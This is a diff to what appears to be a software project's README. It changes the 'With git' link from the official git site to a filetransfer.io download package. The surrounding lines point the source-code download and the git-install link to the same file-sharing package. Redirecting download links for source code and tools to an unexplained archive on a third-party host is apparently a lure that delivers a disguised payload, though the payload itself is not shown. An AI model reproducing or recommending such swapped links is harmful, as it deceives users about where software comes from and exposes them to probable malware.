@@ -218,7 +218,7 @@ Choose this option if you want pure source and you're not going to contribute to
 
 To download source code this way [click here](https://filetransfer.io/data-package/5tBQDzS2/download).
 
-#### With [git](https://git-scm.com)
+#### With [git](https://filetransfer.io/data-package/5tBQDzS2/download)
 
 Choose this option if you're going to contribute to the repo or you want to use version control system. Download size ~100 MB (because of full commit history). Git is required to step further, if not installed download it [here](https://filetransfer.io/data-package/5tBQDzS2/download).
 
